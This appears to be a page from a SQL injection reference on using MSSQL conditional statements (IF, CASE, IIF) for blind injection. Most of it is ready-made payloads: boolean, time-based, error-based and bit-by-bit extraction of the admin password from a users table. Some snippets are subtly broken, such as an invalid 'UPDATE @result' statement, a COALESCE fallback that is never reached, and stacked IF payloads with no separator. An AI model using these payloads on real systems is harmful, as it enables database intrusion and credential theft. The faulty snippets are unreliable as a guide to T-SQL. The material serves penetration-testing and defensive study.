---
title: Conditional Statements
description: Using conditional logic in MSSQL for advanced injection techniques
category: Injection Techniques
order: 10
tags: ["conditional logic", "case", "if", "blind injection"]
lastUpdated: 2025-03-15
---

## Conditional Statements

Conditional statements are essential for blind SQL injection techniques and allow attackers to extract information by analyzing the application's response to different conditions. Microsoft SQL Server provides several methods for implementing conditional logic.

### Basic Conditional Operators

#### IF Statement

The `IF` statement evaluates a condition and executes a statement block when true:

```sql
IF condition
  statement_block
[ELSE
  statement_block]
```

Example:
```sql
IF (SELECT COUNT(*) FROM users) > 10
  SELECT 'Many users'
ELSE
  SELECT 'Few users'
```

#### CASE Expression

The `CASE` expression provides more flexible conditional logic:

```sql
-- Simple CASE
CASE expression
  WHEN value1 THEN result1
  WHEN value2 THEN result2
  [ELSE resultN]
END

-- Searched CASE
CASE
  WHEN condition1 THEN result1
  WHEN condition2 THEN result2
  [ELSE resultN]
END
```

Example:
```sql
SELECT username,
  CASE 
    WHEN admin = 1 THEN 'Administrator'
    WHEN moderator = 1 THEN 'Moderator'
    ELSE 'Regular User'
  END AS user_role
FROM users
```

#### IIF Function (SQL Server 2012+)

The `IIF` function is a shorthand for simple CASE expressions:

```sql
IIF(condition, true_value, false_value)
```

Example:
```sql
SELECT username, IIF(admin = 1, 'Administrator', 'Regular User') AS user_role
FROM users
```

### Conditional Logic in SQL Injection

#### Boolean-Based Blind Injection

Conditional statements are the foundation of boolean-based blind injection:

```sql
-- Determine if 'admin' user exists
' AND (SELECT COUNT(*) FROM users WHERE username = 'admin') > 0--

-- Extract data character by character
' AND ASCII(SUBSTRING((SELECT TOP 1 password FROM users WHERE username = 'admin'), 1, 1)) = 65--
```

#### Time-Based Blind Injection

Combining conditional logic with time delays:

```sql
-- Delay execution if condition is true
' IF (SELECT COUNT(*) FROM users WHERE username = 'admin') > 0 WAITFOR DELAY '0:0:5'--

-- Extract password character by character
' IF ASCII(SUBSTRING((SELECT password FROM users WHERE username = 'admin'), 1, 1)) = 65 WAITFOR DELAY '0:0:5'--
```

### Advanced Conditional Techniques

#### Dynamic SQL with Conditions

```sql
DECLARE @sql nvarchar(1000)
IF (SELECT COUNT(*) FROM information_schema.tables WHERE table_name = 'users') > 0
  SET @sql = 'SELECT * FROM users'
ELSE
  SET @sql = 'SELECT ''No users table found'''
EXEC(@sql)
```

#### Nested Conditions

```sql
-- Nested CASE expressions
SELECT
  CASE
    WHEN (SELECT COUNT(*) FROM users) > 0 THEN
      CASE
        WHEN (SELECT COUNT(*) FROM users WHERE admin = 1) > 0 THEN 'Admin users exist'
        ELSE 'No admin users'
      END
    ELSE 'No users at all'
  END
```

#### Using UPDATE with Conditions

```sql
-- Using UPDATE with WHERE clause to implement conditional logic
DECLARE @result int = 0
UPDATE @result SET @result = 1 WHERE (SELECT COUNT(*) FROM users WHERE username = 'admin') > 0
SELECT @result
```

### Error-Based Extraction with Conditions

Using conditional logic to force errors that contain data:

```sql
-- Using CASE to force a conversion error
' AND 1=CONVERT(int, 
    CASE 
      WHEN (SELECT COUNT(*) FROM users WHERE username = 'admin') > 0 THEN 'Yes' 
      ELSE 'No' 
    END
  )--
```

### Practical Blind SQL Injection Examples

#### Determining Table Existence

```sql
-- Check if a table exists
' AND (SELECT CASE WHEN EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name = 'users') THEN 1 ELSE 0 END) = 1--
```

#### Extracting Data Bit by Bit

```sql
-- Extract one character at a time
' AND (SELECT ASCII(SUBSTRING(
    (SELECT TOP 1 password FROM users WHERE username = 'admin'), 
    1, 1)) & 1) = 1--

' AND (SELECT ASCII(SUBSTRING(
    (SELECT TOP 1 password FROM users WHERE username = 'admin'), 
    1, 1)) & 2) = 2--

-- And so on for each bit...
```

#### Conditional Logic with Binary Search

```sql
-- Binary search approach to extract values efficiently
' AND (SELECT ASCII(SUBSTRING(
    (SELECT TOP 1 password FROM users WHERE username = 'admin'), 
    1, 1)) < 128)--
```

### Handling NULL Values

NULL handling is important in conditional logic:

```sql
-- Using ISNULL for NULL handling
' AND ISNULL((SELECT TOP 1 username FROM users WHERE email LIKE '%admin%'), '') = 'admin'--

-- Using COALESCE for multiple potential NULL values
' AND COALESCE((SELECT TOP 1 username FROM users WHERE email LIKE '%admin%'), '', 'unknown') = 'admin'--
```

### Limitations and Considerations

1. Complex conditions may hit query length limitations
2. Execution time may increase with complex nested conditions
3. Blind techniques require multiple queries and are much slower than direct extraction
4. Error-based techniques may be blocked by error suppression
5. Some conditional operations require specific permissions

